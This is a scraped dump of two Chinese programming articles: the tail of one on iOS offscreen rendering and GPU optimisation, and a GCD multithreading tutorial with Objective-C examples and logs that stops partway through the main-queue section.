<p>Color Offscreen-Rendered Yellow会用黄色标识哪些图层出现了离屏渲染，什么是离屏渲染？<br>离屏渲染表示渲染不是发生在当前屏幕的缓冲区中，而是发生在其他缓冲区的渲染，这就需要开辟更多的缓冲区，等到要用的时候再从其他的缓冲区读取来显示，所以这样会消耗更多的GPU资源，所以避免离屏渲染可以有效的提升显示性能。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030574"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""离屏渲染.png"" title=""离屏渲染.png""></span><br>如上图所示，要显示一个相机图标和一个蒙层，在前两个渲染通道中，GPU分别得到了相机的纹理和蓝色的蒙版layer的渲染结果。但这两个渲染结果没有直接放入Frame Buffer中，这就是离屏渲染。等到第三个渲染通道，才把两者组合起来放入Frame Buffer中最终显示到屏幕上，这就是典型的离屏渲染。<br>运行demo，打开Color Offscreen-Rendered Yellow选项，在beforetab控制器视图下出现离屏渲染的图层便会被黄色标识出来，如图：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030575"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Offscreen.png"" title=""Offscreen.png""></span><br>可以发现右边的大图出现了离屏渲染，而圆角的小图却没有，大图出现离屏渲染的原因是设置了shadow阴影，而因为测试机器是ios11所以设置图片的cornerRadius并不会导致离屏渲染。<br>同样设置了以下属性时，都会触发离屏渲染：</p>
<ul>
<li>shouldRasterize（光栅化）</li>
<li>masks（遮罩）</li>
<li>shadows（阴影）</li>
<li>edge antialiasing（抗锯齿）</li>
<li>group opacity（不透明）</li>
<li>复杂形状设置圆角等（ios8）</li>
<li>渐变</li>
</ul>
<p>上面出现离屏渲染的case都应该要注意，所以针对shadow可以通过设置shadowPath来避免，光栅化也应该尽量避免：<br>优化后代码如下：</p>
<pre><code>        mainImageView.layer.shadowColor = UIColor.black.cgColor
        mainImageView.layer.shadowOpacity = 1
        mainImageView.layer.shadowRadius = 2
//        mainImageView.layer.shadowOffset = CGSize(width: 2, height: 2)
        mainImageView.layer.shadowPath = UIBezierPath.init(roundedRect: mainImageView.bounds, cornerRadius: 2).cgPath
        smallImageView.layer.cornerRadius = smallImageView.frame.size.width / 2
        smallImageView.clipsToBounds = true
        nameLabel.backgroundColor = UIColor.white
        titleLabel.backgroundColor = UIColor.white
        titleLabel.layer.masksToBounds = true
        nameLabel.layer.masksToBounds = true
//        nameLabel.layer.shouldRasterize = true</code></pre>
<h3>8.快速路径</h3>
<p>第七个选项“Color Compositing Fast-Path Blue”用于标记由硬件绘制的路径，蓝色越多越好，demo略</p>
<h3>9.变化区域</h3>
<p>最后一个Flash Updated Regions 用于标记发生重绘制的区域并用黄色标记出来，对于大多数不变的区域应该尽量的避免重绘而只有小部分经常变化的区域重绘这有助于显著提高性能。demo略</p>
<h2>优化结果</h2>
<p>经过对图片Alpha透明度调整，大小剪裁适配显示，更改设置阴影，文本背景等一系列的优化，使用Core Animation记录GPU使用率的变化来观察优化效果：<br>before:<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030576"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""before.png"" title=""before.png""></span><br>可以看到优化前CPU平均占用率达到60%，这还只是简单的视图布局，如果更加复杂占用率还会增加，这也就意味着更高的卡顿风险。</p>
<p>after:<br><span class=""img-wrap""><img data-src=""/img/remote/1460000015030577"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""after.png"" title=""after.png""></span></p>
<p>对比可以发现在提升了平均显示帧数的同时大大降低了GPU消耗，性能得到显著的提升。</p>
<p>测试环境：Xcode9.3、iPhone6s、 iOS11、Swift4<br>Demo地址：<a href=""https://github.com/dangercheng/iOS_skill_demos/tree/master/GraphicsPerformanceOptimization"" rel=""nofollow noreferrer"">GitHub地址</a></p>

                ", iOS显示性能优化过程讲解,1531971863,286,1,460,1,1,https://segmentfault.com/a/1190000015030561
10,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000014850421"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<blockquote><ul>
<li><strong>本文首发于我的个人博客：<a href=""https://bujige.net"" rel=""nofollow noreferrer"">『不羁阁』 </a></strong></li>
<li><strong>文章链接：<a href=""https://bujige.net/blog/iOS-Complete-learning-GCD.html"" rel=""nofollow noreferrer"">传送门</a></strong></li>
</ul></blockquote>
<blockquote>本文用来介绍  iOS 多线程中 GCD 的相关知识以及使用方法。这大概是史上最详细、清晰的关于 GCD 的详细讲解+总结的文章了。通过本文，您将了解到：<br><strong>1. GCD 简介</strong><br><strong>2. GCD 任务和队列</strong><br><strong>3. GCD 的使用步骤</strong><br><strong>4. GCD 的基本使用</strong>（6种不同组合区别）<br><strong>5. GCD 线程间的通信</strong><br><strong>6. GCD 的其他方法</strong>（栅栏方法：dispatch_barrier_async、延时执行方法：dispatch_after、一次性代码（只执行一次）：dispatch_once、快速迭代方法：dispatch_apply、队列组：dispatch_group、信号量：dispatch_semaphore）<p>文中 Demo 我已放在了 Github 上，Demo 链接：<a href=""https://github.com/bujige/YSC-GCD-demo"" rel=""nofollow noreferrer"">传送门</a></p>
</blockquote>
<h1>1. GCD 简介</h1>
<p>什么是 GCD 呢？我们先来看看百度百科的解释简单了解下概念</p>
<blockquote>引自<a href=""http://baike.baidu.com/item/GCD"" rel=""nofollow noreferrer"">百度百科</a><br><strong>Grand Central Dispatch(GCD)</strong> 是 Apple 开发的一个多核编程的较新的解决方法。它主要用于优化应用程序以支持多核处理器以及其他对称多处理系统。它是一个在线程池模式的基础上执行的并发任务。在 Mac OS X 10.6 雪豹中首次推出，也可在 iOS 4 及以上版本使用。</blockquote>
<p><strong>为什么要用 GCD 呢？</strong></p>
<p>因为 GCD 有很多好处啊，具体如下：</p>
<ul>
<li>GCD 可用于多核的并行运算</li>
<li>GCD 会自动利用更多的 CPU 内核（比如双核、四核）</li>
<li>GCD 会自动管理线程的生命周期（创建线程、调度任务、销毁线程）</li>
<li>程序员只需要告诉 GCD 想要执行什么任务，不需要编写任何线程管理代码</li>
</ul>
<p>既然 GCD 有这么多的好处，那么下面我们就来系统的学习一下 GCD 的使用方法。</p>
<h1>2. GCD 任务和队列</h1>
<p>学习 GCD 之前，先来了解 GCD 中两个核心概念：<strong>任务</strong>和<strong>队列</strong>。</p>
<p><strong>任务</strong>：就是执行操作的意思，换句话说就是你在线程中执行的那段代码。在 GCD 中是放在 block 中的。执行任务有两种方式：<strong>同步执行（sync）</strong>和<strong>异步执行（async）</strong>。两者的主要区别是：<strong>是否等待队列的任务执行结束，以及是否具备开启新线程的能力。</strong></p>
<ul>
<li>
<p><strong>同步执行（sync）</strong>：</p>
<ul>
<li>同步添加任务到指定的队列中，在添加的任务执行结束之前，会一直等待，直到队列里面的任务完成之后再继续执行。</li>
<li>只能在当前线程中执行任务，不具备开启新线程的能力。</li>
</ul>
</li>
<li>
<p><strong>异步执行（async）</strong>：</p>
<ul>
<li>异步添加任务到指定的队列中，它不会做任何等待，可以继续执行任务。</li>
<li>可以在新的线程中执行任务，具备开启新线程的能力。</li>
</ul>
</li>
</ul>
<p>举个简单例子：你要打电话给小明和小白。<br>同步执行就是，你打电话给小明的时候，不能同时打给小白，等到给小明打完了，才能打给小白（等待任务执行结束）。而且只能用当前的电话（不具备开启新线程的能力）。<br>而异步执行就是，你打电话给小明的时候，不等和小明通话结束，还能直接给小白打电话，不用等着和小明通话结束再打（不用等待任务执行结束）。除了当前电话，你还可以使用其他所能使用的电话（具备开启新线程的能力）。</p>
<blockquote>注意：<strong>异步执行（async）</strong>虽然具有开启新线程的能力，但是并不一定开启新线程。这跟任务所指定的队列类型有关（下面会讲）。</blockquote>
<p><strong>队列（Dispatch Queue）</strong>：这里的队列指执行任务的等待队列，即用来存放任务的队列。队列是一种特殊的线性表，采用 FIFO（先进先出）的原则，即新任务总是被插入到队列的末尾，而读取任务的时候总是从队列的头部开始读取。每读取一个任务，则从队列中释放一个任务。队列的结构可参考下图：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000014850422"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""队列(Dispatch Queue).png"" title=""队列(Dispatch Queue).png""></span></p>
<p>在 GCD 中有两种队列：<strong>串行队列</strong>和<strong>并发队列</strong>。两者都符合 FIFO（先进先出）的原则。两者的主要区别是：<strong>执行顺序不同，以及开启线程数不同。</strong></p>
<ul>
<li>
<p><strong>串行队列（Serial Dispatch Queue）</strong>：</p>
<ul><li>每次只有一个任务被执行。让任务一个接着一个地执行。（只开启一个线程，一个任务执行完毕后，再执行下一个任务）</li></ul>
</li>
<li>
<p><strong>并发队列（Concurrent Dispatch Queue）</strong>：</p>
<ul><li>可以让多个任务并发（同时）执行。（可以开启多个线程，并且同时执行任务）</li></ul>
</li>
</ul>
<blockquote>注意：<strong>并发队列</strong>的并发功能只有在异步（dispatch_async）函数下才有效</blockquote>
<p>两者具体区别如下两图所示。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000014850423"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""串行队列.png"" title=""串行队列.png""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000014850424"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""并发队列.png"" title=""并发队列.png""></span></p>
<h1>3. GCD 的使用步骤</h1>
<p>GCD 的使用步骤其实很简单，只有两步。</p>
<ol>
<li>创建一个队列（串行队列或并发队列）</li>
<li>将任务追加到任务的等待队列中，然后系统就会根据任务类型执行任务（同步执行或异步执行）</li>
</ol>
<p>下边来看看队列的创建方法/获取方法，以及任务的创建方法。</p>
<h2>3.1 队列的创建方法/获取方法</h2>
<ul><li>可以使用<code>dispatch_queue_create</code>来创建队列，需要传入两个参数，第一个参数表示队列的唯一标识符，用于 DEBUG，可为空，Dispatch Queue 的名称推荐使用应用程序 ID 这种逆序全程域名；第二个参数用来识别是串行队列还是并发队列。<code>DISPATCH_QUEUE_SERIAL</code> 表示串行队列，<code>DISPATCH_QUEUE_CONCURRENT</code> 表示并发队列。</li></ul>
<pre><code class=""objc"">// 串行队列的创建方法
dispatch_queue_t queue = dispatch_queue_create(""net.bujige.testQueue"", DISPATCH_QUEUE_SERIAL);
// 并发队列的创建方法
dispatch_queue_t queue = dispatch_queue_create(""net.bujige.testQueue"", DISPATCH_QUEUE_CONCURRENT);</code></pre>
<ul><li>
<p>对于串行队列，GCD 提供了的一种特殊的串行队列：<strong>主队列（Main Dispatch Queue）</strong>。</p>
<ul>
<li>所有放在主队列中的任务，都会放到主线程中执行。</li>
<li>可使用<code>dispatch_get_main_queue()</code>获得主队列。</li>
</ul>
</li></ul>
<pre><code class=""objc"">// 主队列的获取方法
dispatch_queue_t queue = dispatch_get_main_queue();</code></pre>
<ul><li>
<p>对于并发队列，GCD 默认提供了<strong>全局并发队列（Global Dispatch Queue）</strong>。</p>
<ul><li>可以使用<code>dispatch_get_global_queue</code>来获取。需要传入两个参数。第一个参数表示队列优先级，一般用<code>DISPATCH_QUEUE_PRIORITY_DEFAULT</code>。第二个参数暂时没用，用<code>0</code>即可。</li></ul>
</li></ul>
<pre><code class=""objc"">// 全局并发队列的获取方法
dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);</code></pre>
<h2>3.2 任务的创建方法</h2>
<p>GCD 提供了同步执行任务的创建方法<code>dispatch_sync</code>和异步执行任务创建方法<code>dispatch_async</code>。</p>
<pre><code class=""objc"">// 同步执行任务创建方法
dispatch_sync(queue, ^{
    // 这里放同步执行任务代码
});
// 异步执行任务创建方法
dispatch_async(queue, ^{
    // 这里放异步执行任务代码
});</code></pre>
<p>虽然使用 GCD 只需两步，但是既然我们有两种队列（串行队列/并发队列），两种任务执行方式（同步执行/异步执行），那么我们就有了四种不同的组合方式。这四种不同的组合方式是：</p>
<blockquote><ol>
<li>同步执行 + 并发队列</li>
<li>异步执行 + 并发队列</li>
<li>同步执行 + 串行队列</li>
<li>异步执行 + 串行队列</li>
</ol></blockquote>
<p>实际上，刚才还说了两种特殊队列：全局并发队列、主队列。全局并发队列可以作为普通并发队列来使用。但是主队列因为有点特殊，所以我们就又多了两种组合方式。这样就有六种不同的组合方式了。</p>
<blockquote><ol>
<li>同步执行 + 主队列</li>
<li>异步执行 + 主队列</li>
</ol></blockquote>
<p>那么这几种不同组合方式各有什么区别呢，这里为了方便，先上结果，再来讲解。你可以直接查看表格结果，然后跳过 <strong>4. GCD的基本使用</strong> 。</p>
<table>
<thead><tr>
<th align=""center"">区别</th>
<th align=""center"">并发队列</th>
<th align=""center"">串行队列</th>
<th align=""center"">主队列</th>
</tr></thead>
<tbody>
<tr>
<td align=""center"">同步(sync)</td>
<td align=""center"">没有开启新线程，串行执行任务</td>
<td align=""center"">没有开启新线程，串行执行任务</td>
<td align=""center"">主线程调用：死锁卡住不执行<br>其他线程调用：没有开启新线程，串行执行任务</td>
</tr>
<tr>
<td align=""center"">异步(async)</td>
<td align=""center"">有开启新线程，并发执行任务</td>
<td align=""center"">有开启新线程(1条)，串行执行任务</td>
<td align=""center"">没有开启新线程，串行执行任务</td>
</tr>
</tbody>
</table>
<p>下边我们来分别讲讲这几种不同的组合方式的使用方法。</p>
<h1>4. GCD 的基本使用</h1>
<p><strong>先来讲讲并发队列的两种执行方式。</strong></p>
<h2>4.1 同步执行 + 并发队列</h2>
<ul><li>在当前线程中执行任务，不会开启新线程，执行完一个任务，再执行下一个任务。</li></ul>
<pre><code class=""objc"">/**
 * 同步执行 + 并发队列
 * 特点：在当前线程中执行任务，不会开启新线程，执行完一个任务，再执行下一个任务。
 */
- (void)syncConcurrent {
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""syncConcurrent---begin"");
    
    dispatch_queue_t queue = dispatch_queue_create(""net.bujige.testQueue"", DISPATCH_QUEUE_CONCURRENT);
    
    dispatch_sync(queue, ^{
        // 追加任务1
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_sync(queue, ^{
        // 追加任务2
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_sync(queue, ^{
        // 追加任务3
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""3---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    NSLog(@""syncConcurrent---end"");
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 20:34:55.095932+0800 YSC-GCD-demo[19892:4996930] currentThread---&lt;NSThread: 0x60400006bbc0&gt;{number = 1, name = main}<br>2018-02-23 20:34:55.096086+0800 YSC-GCD-demo[19892:4996930] syncConcurrent---begin<br>2018-02-23 20:34:57.097589+0800 YSC-GCD-demo[19892:4996930] 1---&lt;NSThread: 0x60400006bbc0&gt;{number = 1, name = main}<br>2018-02-23 20:34:59.099100+0800 YSC-GCD-demo[19892:4996930] 1---&lt;NSThread: 0x60400006bbc0&gt;{number = 1, name = main}<br>2018-02-23 20:35:01.099843+0800 YSC-GCD-demo[19892:4996930] 2---&lt;NSThread: 0x60400006bbc0&gt;{number = 1, name = main}<br>2018-02-23 20:35:03.101171+0800 YSC-GCD-demo[19892:4996930] 2---&lt;NSThread: 0x60400006bbc0&gt;{number = 1, name = main}<br>2018-02-23 20:35:05.101750+0800 YSC-GCD-demo[19892:4996930] 3---&lt;NSThread: 0x60400006bbc0&gt;{number = 1, name = main}<br>2018-02-23 20:35:07.102414+0800 YSC-GCD-demo[19892:4996930] 3---&lt;NSThread: 0x60400006bbc0&gt;{number = 1, name = main}<br>2018-02-23 20:35:07.102575+0800 YSC-GCD-demo[19892:4996930] syncConcurrent---end</blockquote>
<p>从<code>同步执行 + 并发队列</code>中可看到：</p>
<ul>
<li>所有任务都是在当前线程（主线程）中执行的，没有开启新的线程（<code>同步执行</code>不具备开启新线程的能力）。</li>
<li>所有任务都在打印的<code>syncConcurrent---begin</code>和<code>syncConcurrent---end</code>之间执行的（<code>同步任务</code>需要等待队列的任务执行结束）。</li>
<li>任务按顺序执行的。按顺序执行的原因：虽然<code>并发队列</code>可以开启多个线程，并且同时执行多个任务。但是因为本身不能创建新线程，只有当前线程这一个线程（<code>同步任务</code>不具备开启新线程的能力），所以也就不存在并发。而且当前线程只有等待当前队列中正在执行的任务执行完毕之后，才能继续接着执行下面的操作（<code>同步任务</code>需要等待队列的任务执行结束）。所以任务只能一个接一个按顺序执行，不能同时被执行。</li>
</ul>
<h2>4.2 异步执行 + 并发队列</h2>
<ul><li>可以开启多个线程，任务交替（同时）执行。</li></ul>
<pre><code class=""objc"">/**
 * 异步执行 + 并发队列
 * 特点：可以开启多个线程，任务交替（同时）执行。
 */
- (void)asyncConcurrent {
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""asyncConcurrent---begin"");
    
    dispatch_queue_t queue = dispatch_queue_create(""net.bujige.testQueue"", DISPATCH_QUEUE_CONCURRENT);
    
    dispatch_async(queue, ^{
        // 追加任务1
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_async(queue, ^{
        // 追加任务2
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_async(queue, ^{
        // 追加任务3
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""3---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    NSLog(@""asyncConcurrent---end"");
}</code></pre>
<blockquote>输出结果：<br>2018-02-23 20:36:41.769269+0800 YSC-GCD-demo[19929:5005237] currentThread---&lt;NSThread: 0x604000062d80&gt;{number = 1, name = main}<br>2018-02-23 20:36:41.769496+0800 YSC-GCD-demo[19929:5005237] asyncConcurrent---begin<br>2018-02-23 20:36:41.769725+0800 YSC-GCD-demo[19929:5005237] asyncConcurrent---end<br>2018-02-23 20:36:43.774442+0800 YSC-GCD-demo[19929:5005566] 2---&lt;NSThread: 0x604000266f00&gt;{number = 5, name = (null)}<br>2018-02-23 20:36:43.774440+0800 YSC-GCD-demo[19929:5005567] 3---&lt;NSThread: 0x60000026f200&gt;{number = 4, name = (null)}<br>2018-02-23 20:36:43.774440+0800 YSC-GCD-demo[19929:5005565] 1---&lt;NSThread: 0x600000264800&gt;{number = 3, name = (null)}<br>2018-02-23 20:36:45.779286+0800 YSC-GCD-demo[19929:5005567] 3---&lt;NSThread: 0x60000026f200&gt;{number = 4, name = (null)}<br>2018-02-23 20:36:45.779302+0800 YSC-GCD-demo[19929:5005565] 1---&lt;NSThread: 0x600000264800&gt;{number = 3, name = (null)}<br>2018-02-23 20:36:45.779286+0800 YSC-GCD-demo[19929:5005566] 2---&lt;NSThread: 0x604000266f00&gt;{number = 5, name = (null)}</blockquote>
<p>在<code>异步执行 + 并发队列</code>中可以看出：</p>
<ul>
<li>除了当前线程（主线程），系统又开启了3个线程，并且任务是交替/同时执行的。（<code>异步执行</code>具备开启新线程的能力。且<code>并发队列</code>可开启多个线程，同时执行多个任务）。</li>
<li>所有任务是在打印的<code>syncConcurrent---begin</code>和<code>syncConcurrent---end</code>之后才执行的。说明当前线程没有等待，而是直接开启了新线程，在新线程中执行任务（<code>异步执行</code>不做等待，可以继续执行任务）。</li>
</ul>
<p><strong>接下来再来讲讲串行队列的两种执行方式。</strong></p>
<h2>4.3 同步执行 + 串行队列</h2>
<ul><li>不会开启新线程，在当前线程执行任务。任务是串行的，执行完一个任务，再执行下一个任务。</li></ul>
<pre><code class=""objc"">/**
 * 同步执行 + 串行队列
 * 特点：不会开启新线程，在当前线程执行任务。任务是串行的，执行完一个任务，再执行下一个任务。
 */
- (void)syncSerial {
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""syncSerial---begin"");
    
    dispatch_queue_t queue = dispatch_queue_create(""net.bujige.testQueue"", DISPATCH_QUEUE_SERIAL);
    
    dispatch_sync(queue, ^{
        // 追加任务1
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    dispatch_sync(queue, ^{
        // 追加任务2
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    dispatch_sync(queue, ^{
        // 追加任务3
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""3---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    NSLog(@""syncSerial---end"");
}</code></pre>
<blockquote>输出结果为：<br>2018-02-23 20:39:37.876811+0800 YSC-GCD-demo[19975:5017162] currentThread---&lt;NSThread: 0x604000079400&gt;{number = 1, name = main}<br>2018-02-23 20:39:37.876998+0800 YSC-GCD-demo[19975:5017162] syncSerial---begin<br>2018-02-23 20:39:39.878316+0800 YSC-GCD-demo[19975:5017162] 1---&lt;NSThread: 0x604000079400&gt;{number = 1, name = main}<br>2018-02-23 20:39:41.879829+0800 YSC-GCD-demo[19975:5017162] 1---&lt;NSThread: 0x604000079400&gt;{number = 1, name = main}<br>2018-02-23 20:39:43.880660+0800 YSC-GCD-demo[19975:5017162] 2---&lt;NSThread: 0x604000079400&gt;{number = 1, name = main}<br>2018-02-23 20:39:45.881265+0800 YSC-GCD-demo[19975:5017162] 2---&lt;NSThread: 0x604000079400&gt;{number = 1, name = main}<br>2018-02-23 20:39:47.882257+0800 YSC-GCD-demo[19975:5017162] 3---&lt;NSThread: 0x604000079400&gt;{number = 1, name = main}<br>2018-02-23 20:39:49.883008+0800 YSC-GCD-demo[19975:5017162] 3---&lt;NSThread: 0x604000079400&gt;{number = 1, name = main}<br>2018-02-23 20:39:49.883253+0800 YSC-GCD-demo[19975:5017162] syncSerial---end</blockquote>
<p>在<code>同步执行 + 串行队列</code>可以看到：</p>
<ul>
<li>所有任务都是在当前线程（主线程）中执行的，并没有开启新的线程（<code>同步执行</code>不具备开启新线程的能力）。</li>
<li>所有任务都在打印的<code>syncConcurrent---begin</code>和<code>syncConcurrent---end</code>之间执行（<code>同步任务</code>需要等待队列的任务执行结束）。</li>
<li>任务是按顺序执行的（<code>串行队列</code>每次只有一个任务被执行，任务一个接一个按顺序执行）。</li>
</ul>
<h2>4.4 异步执行 + 串行队列</h2>
<ul><li>会开启新线程，但是因为任务是串行的，执行完一个任务，再执行下一个任务</li></ul>
<pre><code class=""objc"">/**
 * 异步执行 + 串行队列
 * 特点：会开启新线程，但是因为任务是串行的，执行完一个任务，再执行下一个任务。
 */
- (void)asyncSerial {
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""asyncSerial---begin"");
    
    dispatch_queue_t queue = dispatch_queue_create(""net.bujige.testQueue"", DISPATCH_QUEUE_SERIAL);
    
    dispatch_async(queue, ^{
        // 追加任务1
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    dispatch_async(queue, ^{
        // 追加任务2
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    dispatch_async(queue, ^{
        // 追加任务3
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""3---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    NSLog(@""asyncSerial---end"");
}</code></pre>
<blockquote>输出结果为：<br>2018-02-23 20:41:17.029999+0800 YSC-GCD-demo[20008:5024757] currentThread---&lt;NSThread: 0x604000070440&gt;{number = 1, name = main}<br>2018-02-23 20:41:17.030212+0800 YSC-GCD-demo[20008:5024757] asyncSerial---begin<br>2018-02-23 20:41:17.030364+0800 YSC-GCD-demo[20008:5024757] asyncSerial---end<br>2018-02-23 20:41:19.035379+0800 YSC-GCD-demo[20008:5024950] 1---&lt;NSThread: 0x60000026e100&gt;{number = 3, name = (null)}<br>2018-02-23 20:41:21.037140+0800 YSC-GCD-demo[20008:5024950] 1---&lt;NSThread: 0x60000026e100&gt;{number = 3, name = (null)}<br>2018-02-23 20:41:23.042220+0800 YSC-GCD-demo[20008:5024950] 2---&lt;NSThread: 0x60000026e100&gt;{number = 3, name = (null)}<br>2018-02-23 20:41:25.042971+0800 YSC-GCD-demo[20008:5024950] 2---&lt;NSThread: 0x60000026e100&gt;{number = 3, name = (null)}<br>2018-02-23 20:41:27.047690+0800 YSC-GCD-demo[20008:5024950] 3---&lt;NSThread: 0x60000026e100&gt;{number = 3, name = (null)}<br>2018-02-23 20:41:29.052327+0800 YSC-GCD-demo[20008:5024950] 3---&lt;NSThread: 0x60000026e100&gt;{number = 3, name = (null)}</blockquote>
<p>在<code>异步执行 + 串行队列</code>可以看到：</p>
<ul>
<li>开启了一条新线程（<code>异步执行</code>具备开启新线程的能力，<code>串行队列</code>只开启一个线程）。</li>
<li>所有任务是在打印的<code>syncConcurrent---begin</code>和<code>syncConcurrent---end</code>之后才开始执行的（<code>异步执行</code>不会做任何等待，可以继续执行任务）。</li>
<li>任务是按顺序执行的（<code>串行队列</code>每次只有一个任务被执行，任务一个接一个按顺序执行）。</li>
</ul>
<p>下边讲讲刚才我们提到过的特殊队列：<strong>主队列</strong>。</p>
<ul><li>
<p>主队列：GCD自带的一种特殊的<strong>串行队列</strong></p>
<ul>
<li>所有放在主队列中的任务，都会放到主线程中执行</li>
<li>可使用<code>dispatch_get_main_queue()</code>获得主队列</li>
</ul>
</li></ul>
<p><strong>我们再来看看主队列的两种组合方式。</strong></p>
<h2>4.5 同步执行 + 主队列</h2>
<p><code>同步执行 + 主队列</code>在不同线程中调用结果也是不一样，在主线程中调用会出现死锁，而在其他线程中则不会。</p>
<h3>4.5.1 在主线程中调用<code>同步执行 + 主队列</code>
</h3>
<ul><li>互相等待卡住不可行</li></ul>
<pre><code class=""objc"">/**
 * 同步执行 + 主队列
 * 特点(主线程调用)：互等卡主不执行。
 * 特点(其他线程调用)：不会开启新线程，执行完一个任务，再执行下一个任务。
 */
- (void)syncMain {
    
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""syncMain---begin"");
    
    dispatch_queue_t queue = dispatch_get_main_queue();
    
    dispatch_sync(queue, ^{
        // 追加任务1
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""1---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_sync(queue, ^{
        // 追加任务2
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""2---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    dispatch_sync(queue, ^{
        // 追加任务3
        for (int i = 0; i &lt; 2; ++i) {
            [NSThread sleepForTimeInterval:2];              // 模拟耗时操作
            NSLog(@""3---%@"",[NSThread currentThread]);      // 打印当前线程
        }
    });
    
    NSLog(@""syncMain---end"");
}</code></pre>
<blockquote>输出结果<br>2018-02-23 20:42:36.842892+0800 YSC-GCD-demo[20041:5030982] currentThread---&lt;NSThread: 0x600000078a00&gt;{number = 1, name = main}<br>2018-02-23 20:42:36.843050+0800 YSC-GCD-demo[20041:5030982] syncMain---begin<br>(lldb)</blockquote>
<p>在<code>同步执行 + 主队列</code>可以惊奇的发现：</p>
<ul><li>在主线程中使用<code>同步执行 + 主队列</code>，追加到主线程的任务1、任务2、任务3都不再执行了，而且<code>syncMain---end</code>也没有打印，在XCode 9上还会报崩溃。这是为什么呢？</li></ul>
<p>这是因为我们在主线程中执行<code>syncMain</code>方法，相当于把<code>syncMain </code>任务放到了主线程的队列中。而<code>同步执行</code>会等待当前队列中的任务执行完毕，才会接着执行。那么当我们把<code>任务1</code>追加到主队列中，<code>任务1</code>就在等待主线程处理完<code>syncMain</code>任务。而<code>syncMain</code>任务需要等待<code>任务1</code>执行完毕，才能接着执行。</p>
<p>那么，现在的情况就是<code>syncMain</code>任务和<code>任务1</code>都在等对方执行完毕。这样大家互相等待，所以就卡住了，所以我们的任务执行不了，而且<code>syncMain---end</code>也没有打印。</p>
<p><strong>要是如果不在主线程中调用，而在其他线程中调用会如何呢？</strong></p>
<h3>4.5.2 在其他线程中调用<code>同步执行 + 主队列</code>
</h3>
<ul><li>不会开启新线程，执行完一个任务，再执行下一个任务</li></ul>
<pre><code class=""objc"">// 使用 NSThread 的 detachNewThreadSelector 方法会创建线程，并自动启动线程执行
 selector 任务
[NSThread detachNewThreadSelector:@selector(syncMain) toTarget:self withObject:nil];</code></pre>
